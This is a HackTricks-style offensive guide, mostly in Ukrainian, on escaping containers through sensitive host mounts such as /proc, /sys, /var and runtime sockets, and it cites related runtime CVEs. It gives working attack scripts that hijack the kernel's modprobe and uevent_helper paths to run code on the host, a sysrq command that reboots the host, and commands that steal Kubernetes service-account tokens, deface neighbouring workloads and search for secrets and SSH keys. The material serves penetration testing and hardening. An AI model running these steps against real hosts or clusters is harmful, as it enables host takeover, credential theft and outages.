# Чутливі монтовані шляхи хоста

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Host mounts — одна з найважливіших практичних поверхонь для container-escape, оскільки вони часто руйнують ретельно ізольований вигляд процесів і повертають прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, або шляхи, пов'язані з пристроями, можуть відкривати kernel controls, credentials, файлові системи сусідніх контейнерів і runtime management interfaces.

Ця сторінка існує окремо від сторінок індивідуального захисту, тому що модель зловживання є перетинною. Записуване монтоване середовище хоста є небезпечним частково через mount namespaces, частково через user namespaces, частково через покриття AppArmor чи SELinux, і частково через те, який саме шлях хоста було відкрито. Розгляд теми окремо робить attack surface значно простішим для аналізу.

## `/proc` Експозиція

procfs містить і звичайну інформацію про процеси, і критично важливі інтерфейси керування ядром. Bind mount такий як `-v /proc:/host/proc` або вигляд контейнера, який відкриває несподівані записувані записи proc, може призвести до розкриття інформації, DoS або прямого виконання коду на хості.

Важливі шляхи procfs включають:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Почніть з перевірки, які важливі записи procfs видимі або доступні для запису:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

- `/proc/sys/kernel/core_pattern`
Якщо доступний для запису, це один із найбільш високопотенційних шляхів в procfs, оскільки ядро виконає обробник pipe після збою. Контейнер, який може вказати `core_pattern` на payload, збережений у його overlay або в змонтованому шляху на хості, часто може отримати виконання коду на хості. Див. також [read-only-paths.md](protections/read-only-paths.md) для спеціального прикладу.
- `/proc/sys/kernel/modprobe`
Цей шлях контролює userspace helper, який використовує ядро, коли потрібно викликати логіку завантаження модулів. Якщо доступний для запису з контейнера і інтерпретується в контексті хоста, він може стати ще одним примітивом для виконання коду на хості. Особливо цікавим є поєднання з механізмом, що дозволяє спровокувати виклик цього helper.
- `/proc/sys/vm/panic_on_oom`
Зазвичай це не «чистий» примітив для ескейпу, але може перетворити тиск пам’яті на відмову в обслуговуванні для всього хоста, зробивши умови OOM тригером паніки ядра.
- `/proc/sys/fs/binfmt_misc`
Якщо інтерфейс реєстрації доступний для запису, атакуючий може зареєструвати обробник для обраного magic value і отримати виконання в контексті хоста при запуску відповідного файлу.
- `/proc/config.gz`
Корисно для триажу експлойтів ядра. Допомагає визначити, які підсистеми, пом’якшення та додаткові можливості ядра увімкнені, без потреби в метаданих пакетів хоста.
- `/proc/sysrq-trigger`
Переважно шлях для відмови в обслуговуванні, але дуже серйозний. Може негайно перезавантажити систему, викликати паніку або іншим чином порушити роботу хоста.
- `/proc/kmsg`
Надає повідомлення кільця ядра. Корисно для fingerprinting хоста, аналізу крашів і в деяких середовищах для отримання інформації, корисної для експлуатації ядра.
- `/proc/kallsyms`
Цінне при читанні, оскільки відкриває інформацію про експортовані символи ядра і може допомогти подолати припущення про рандомізацію адрес під час розробки експлойтів ядра.
- `/proc/[pid]/mem`
Це прямий інтерфейс до пам’яті процесу. Якщо цільовий процес доступний за необхідних умов, схожих на ptrace, це може дозволити читання або модифікацію пам’яті іншого процесу. Реальний вплив сильно залежить від облікових даних, `hidepid`, Yama та обмежень ptrace, тому це потужний, але умовний шлях.
- `/proc/kcore`
Дає вигляд системної пам’яті у стилі core-image. Файл величезний і незручний у використанні, але якщо він значною мірою доступний для читання, це вказує на погано відкриту поверхню пам’яті хоста.
- `/proc/kmem` and `/proc/mem`
Історично — дуже небезпечні інтерфейси сирої пам’яті. На багатьох сучасних системах вони відключені або жорстко обмежені, але якщо присутні та використовувані, їх слід вважати критичними знахідками.
- `/proc/sched_debug`
Розкриває інформацію про планування та задачі, що може виказати ідентичності процесів хоста навіть коли інші перегляди процесів виглядають чистішими, ніж очікується.
- `/proc/[pid]/mountinfo`
Надзвичайно корисно для реконструкції того, де контейнер насправді знаходиться на хості, які шляхи підкріплені overlay і чи відповідає записуване монтування вмісту хоста або лише шару контейнера.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, оскільки ряд трюків для виконання на хості вимагає приведення шляху всередині контейнера до відповідного шляху з точки зору хоста.

### Повний приклад: `modprobe` Helper Path Abuse

Якщо `/proc/sys/kernel/modprobe` доступний для запису з контейнера, і helper path інтерпретується в контексті хоста, його можна перенаправити на attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки ядра, але важливий момент у тому, що записуваний шлях до допоміжного файлу може перенаправити майбутній виклик допоміжного механізму ядра на вміст шляху хоста, контрольований зловмисником.

### Повний приклад: розвідка ядра з `kallsyms`, `kmsg` та `config.gz`

Якщо мета — оцінка експлойтибельності, а не негайний escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають відповісти, чи видима корисна інформація про символи, чи останні повідомлення ядра розкривають цікавий стан, і які можливості ядра або міри пом'якшення вбудовані під час компіляції. Наслідок зазвичай не є прямим escape, але це може суттєво скоротити тріаж вразливостей ядра.

### Повний приклад: SysRq Host Reboot

Якщо `/proc/sysrq-trigger` доступний для запису та бачиться на хості:
```bash
echo b > /proc/sysrq-trigger
```
Наслідком є негайне перезавантаження хоста. Це не тонкий приклад, але він чітко демонструє, що експозиція procfs може бути набагато серйознішою за розкриття інформації.

## `/sys` Експозиція

sysfs відкриває великі обсяги стану ядра та пристроїв. Деякі шляхи sysfs здебільшого корисні для fingerprinting, тоді як інші можуть впливати на виконання допоміжних програм, поведінку пристроїв, конфігурацію security-модулів або стан прошивки.

Особливо важливі шляхи sysfs включають:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи мають значення з різних причин. `/sys/class/thermal` може впливати на поведінку thermal-management і, отже, на стабільність хоста в сильно відкритих середовищах. `/sys/kernel/vmcoreinfo` може leak інформацію про crash-dump і kernel-layout, що допомагає з низькорівневим fingerprinting хоста. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовують Linux Security Modules, тому несподіваний доступ туди може розкрити або змінити стан, пов'язаний із MAC. Шляхи змінних EFI можуть впливати на налаштування завантаження, що зберігаються у прошивці, роблячи їх значно серйознішими, ніж звичайні конфігураційні файли. `debugfs` під `/sys/kernel/debug` особливо небезпечний, оскільки це навмисно орієнтований на розробників інтерфейс з набагато меншими очікуваннями безпеки, ніж hardened production-facing kernel APIs.

Корисні команди для перегляду цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Чому ці команди цікаві:

- `/sys/kernel/security` може показати, чи AppArmor, SELinux або інша поверхня LSM видима таким чином, що мала залишатися доступною лише на хості.
- `/sys/kernel/debug` часто є найтривожнішою знахідкою в цій групі. Якщо `debugfs` змонтовано і доступний для читання або запису, очікуйте широкий інтерфейс, орієнтований на ядро, ризик якого залежить від увімкнених debug nodes.
- EFI variable exposure трапляється рідше, але якщо присутня — має великий вплив, оскільки стосується налаштувань, захищених прошивкою, а не звичайних файлів виконання.
- `/sys/class/thermal` переважно стосується стабільності хоста та взаємодії з апаратним забезпеченням, а не дає можливості для shell-style escape.
- `/sys/kernel/vmcoreinfo` переважно джерело для host-fingerprinting і crash-analysis, корисне для розуміння низькорівневого стану ядра.

### Full Example: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, ядро може виконати attacker-controlled helper коли тригериться `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.

## `/var` Експозиція

Монтування host's `/var` у container часто недооцінюють, бо воно не виглядає так драматично, як монтування `/`. На практиці цього часто достатньо, щоб дістатися до runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens та сусідніх application filesystems. На сучасних вузлах `/var` часто містить найбільш операційно цікаві стани container.

### Приклад Kubernetes

Pod з `hostPath: /var` часто може читати projected tokens інших pod'ів та overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, бо дають відповідь на питання, чи монтування розкриває лише незначні дані програми або критичні облікові дані кластера. Читабельний service-account token може миттєво перетворити local code execution на доступ до Kubernetes API.

Якщо токен присутній, перевірте, до чого він має доступ, замість того щоб зупинятися лише на виявленні токена:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Наслідки тут можуть бути значно більшими, ніж доступ лише до локального вузла. token із широкими правами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Docker та containerd — приклад

На хостах Docker відповідні дані часто розташовані під `/var/lib/docker`, тоді як на Kubernetes-вузлах на основі containerd вони можуть бути під `/var/lib/containerd` або у шляхах, специфічних для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває записуваний вміст snapshot іншого workload, зловмисник може змінювати файли застосунку, підкладати веб-контент або змінювати скрипти запуску без зміни поточної конфігурації контейнера.

Конкретні ідеї зловживань після виявлення записуваного вмісту snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, оскільки показують три основні категорії впливу змонтованої `/var`: маніпуляція застосунками, відновлення секретів і латеральне переміщення в сусідні робочі навантаження.

## Сокети часу виконання

Чутливі монтовані шляхи хоста часто містять сокети часу виконання замість повних директорій. Вони настільки важливі, що заслуговують на окреме повторення тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) для full exploitation flows, коли один із цих sockets змонтовано.

Як швидкий початковий шаблон взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із них вдасться, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай набагато коротший, ніж будь-який шлях kernel breakout.

## Mount-Related CVEs

Host mounts також перетинаються з runtime-уразливостями. Важливі недавні приклади включають:

- `CVE-2024-21626` у `runc`, де leaked directory file descriptor міг помістити робочий каталог у файлову систему хоста.
- `CVE-2024-23651` та `CVE-2024-23653` у BuildKit, де OverlayFS copy-up races могли спричиняти записи по host-шляху під час збірок.
- `CVE-2024-1753` у Buildah та Podman build flows, де спеціально сформовані bind mounts під час збірки могли відкрити `/` з правами read-write.
- `CVE-2024-40635` у containerd, де велике значення `User` могло overflow-ити до поведінки як UID 0.

Ці CVE важливі тут, оскільки показують, що обробка монтувань — це не лише про конфігурацію оператора. Сам runtime також може вносити mount-driven escape conditions.

## Checks

Використайте ці команди, щоб швидко локалізувати найбільш критичні експозиції mount-ів:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Корінь хоста, `/proc`, `/sys`, `/var` та сокети виконання — усі є знахідками високого пріоритету.
- Записувані записи `/proc` і `/sys` часто означають, що монтування відкриває глобальні керування ядром хоста замість безпечного подання контейнера.
- Змонтовані шляхи `/var` потребують перевірки облікових даних та сусідніх робочих навантажень, а не лише огляду файлової системи.
{{#include ../../../banners/hacktricks-training.md}}
